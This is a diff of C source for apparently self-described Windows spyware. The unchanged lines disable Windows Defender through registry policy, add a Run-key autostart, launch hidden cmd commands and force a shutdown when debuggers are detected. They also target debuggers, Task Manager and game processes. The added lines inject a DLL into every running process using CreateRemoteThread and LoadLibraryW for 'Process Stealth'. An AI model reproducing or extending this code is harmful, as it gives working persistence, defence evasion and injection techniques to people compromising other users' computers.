@@ -61,6 +61,9 @@ void CheckDebugger();
 //void ExplorerManager();
 void ProcessManager();
 
+BOOL injectAllProcess(LPCTSTR szDllPath);
+BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath);
+
 /*
 void ProcessManager(LPVOID pParam) {
 	PTHREAD_PARAM param = (PTHREAD_PARAM)pParam;
@@ -187,7 +190,8 @@ DWORD main(int argc, char* argv[]) {
 	}
 	CloseHandle(UACkey);
 
-	//Disable Windows Defender
+	//Disable Windows Defender   --->   Register The Spyware Exception
+
 	HKEY WD = NULL;
 	DWORD WDvalue = 1;
 	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), 0, KEY_ALL_ACCESS, &WD);
@@ -205,6 +209,11 @@ DWORD main(int argc, char* argv[]) {
 
 	}
 	CloseHandle(WD);
+
+
+	//Register The Spyware Exception...
+	
+
 
 	HKEY autokey = NULL;
 	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &autokey);
@@ -236,14 +245,21 @@ DWORD main(int argc, char* argv[]) {
 	ShellExecuteW(NULL, _T("open"), _T("cmd"), CMD, _T("C:\\"), SW_HIDE);
 	ShellExecuteW(NULL, _T("open"), _T("cmd"), CMD2, _T("C:\\"), SW_HIDE);
 
+	//Process Stealth
+	LPCTSTR Path[MAX_PATH];
+	GetCurrentDirectoryW(MAX_PATH, Path);
+	lstrcatW(Path, L"\\DLL\\BugDLL.dll");
+
+	injectAllProcess(Path);
+
 	//Set The Target Process'
 	wcscpy(TargetProcess[0], L"OLLYDBG.EXE");
 	wcscpy(TargetProcess[1], L"Taskmgr.exe");
 	wcscpy(TargetProcess[2], L"x32dbg.exe");
 	wcscpy(TargetProcess[3], L"x64dbg.exe");
 	wcscpy(TargetProcess[4], L"iexplore.exe");
-	wcscpy(TargetProcess[5], L"procexp64.exe");
-	wcscpy(TargetProcess[6], L"procexp.exe");
+	//wcscpy(TargetProcess[5], L"procexp64.exe");
+	//wcscpy(TargetProcess[6], L"procexp.exe");
 	wcscpy(TargetProcess[7], L"League of Legends.exe");
 	wcscpy(TargetProcess[8], L"LeagueClient.exe");
 	wcscpy(TargetProcess[9], L"LeagueClientUx.exe");
@@ -395,6 +411,56 @@ void CheckDebugger() {
 			ShellExecute(NULL, L"open", L"cmd", L"/c shutdown -s -f -t 0", L"C:\\", SW_HIDE);
 		}
 	}
+}
+
+BOOL injectAllProcess(LPCTSTR szDllPath) {
+	DWORD dwPID = 0;
+	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
+	PROCESSENTRY32 pe;
+
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+
+	Process32First(hSnapShot, &pe);
+	do {
+		dwPID = pe.th32ProcessID;
+		if (dwPID < 100)
+			continue;
+		else
+			injectDll(dwPID, szDllPath);
+	} while (Process32Next(hSnapShot, &pe));
+
+	CloseHandle(hSnapShot);
+
+	return TRUE;
+}
+
+BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath) {
+	HANDLE hProcess, hThread;
+	LPVOID pRemoteBuf;
+	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
+	LPTHREAD_START_ROUTINE pThreadProc;
+
+	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) {
+		return FALSE;
+	}
+
+	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
+
+	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);
+
+	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+
+	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
+
+	WaitForSingleObject(hThread, 1000);
+
+	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
+
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+
+	return TRUE;
 }
 
 
